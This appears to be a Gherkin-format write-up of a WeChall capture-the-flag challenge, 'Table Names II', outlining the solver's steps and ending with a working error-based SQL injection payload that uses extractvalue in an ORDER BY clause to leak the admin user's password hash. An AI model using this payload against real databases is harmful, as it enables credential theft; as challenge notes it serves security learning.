Feature: Solve the challenge Table Names II
  From www.wechall.net
  With my username eRr0r404a
  
  Scenario: Successful solution
    Given a grid
    When I see the source code
      And I search in google about orber by SQLi
      And I read about exploitation using XPATH injection
      And I find the md5 hash of admin 
    Then  I solve the challenge
##pay load 1,extractvalue(0x0a,concat(0x0a,(select password from users where username=0x41646d696e)))#
